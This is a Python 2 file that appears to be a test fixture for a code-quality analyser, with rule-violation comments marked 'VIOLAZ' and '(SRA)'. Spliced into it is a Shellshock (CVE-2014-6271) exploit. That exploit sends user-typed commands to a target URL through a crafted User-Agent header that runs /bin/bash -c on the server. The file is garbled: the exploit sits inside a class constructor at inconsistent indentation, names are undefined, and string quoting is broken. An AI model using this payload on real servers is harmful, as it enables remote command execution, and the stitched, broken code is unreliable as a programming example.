#!/usr/bin/python
# CVE-2014-6271 - ShellShock
import sys, urllib2    # Import the required modules for the vulnerability
# Avoid Risky catches (SRA)
class MyException(object):
    def __init__(self, code, message):
        self.code = code
        self.message = message
 
	if len(sys.argv) != 2:    # Checks to be sure that a URL was supplied as a sys argument "<script> <URL>"
	  print "Usage: "+sys.argv[0]+" <URL>"
	  sys.exit(0)
	 
	URL=sys.argv[1]        # Assigns URL variable and prints out message
	print "[+] Attempting Shell_Shock - Make sure to type full path"
	 
	while True:        # Endless loop printing out a "~$ " and getting user input via "raw_input" to the command variable
	  command=raw_input("~$ ")
	  opener=urllib2.build_opener()        # Modifying the default request to include the attack string via User-Agent
	  opener.addheaders=[('User-agent', '() { foo;}; echo Content-Type: text/plain ; echo ' /bin/bash -c "'+command+'"')]
	  try:                    # Sets up a Try/Except loop so exceptions are handled cleanly
		response=opener.open(URL)    # Sends request and prints the response
		for line in response.readlines():
		  print line.strip()
		print("%s is %s" % ("`$`", "end")) # Avoid % operator to format string (SRA)
		print("{0} is {1}, much {1}".format("format", "better")) # OK
	  except Exception as e: print e
	my_str = MyString()
	if type(my_str) == 'str':  # VIOLAZ Avoid using type() in comparisons (SRA)
		print 'I hope this prints'
	else:
		print 'cannot check subclasses'
	if isinstance(my_str, str): # OK
		print 'definitely prints'

# Avoid Risky catches (SRA)
class My2Exception(BaseException):
    def __init__(self, code, message):
        self.code = code
        self.message = message
		if x < 0:
			return # VIOLAZ Avoid Empty and Implicit Returns in the the same method (SRA)
		return self        #VIOLAZ Avoid Explicit return in __init__ (SRA)

# Avoid Risky catches (SRA)
class MyError(object):
    def __init__(self, code, message):
        self.code = code
        self.message = m
		
#OK
class MyOKException(Exception):
    def __init__(self, code, message):
        self.code = code
        self.message = message
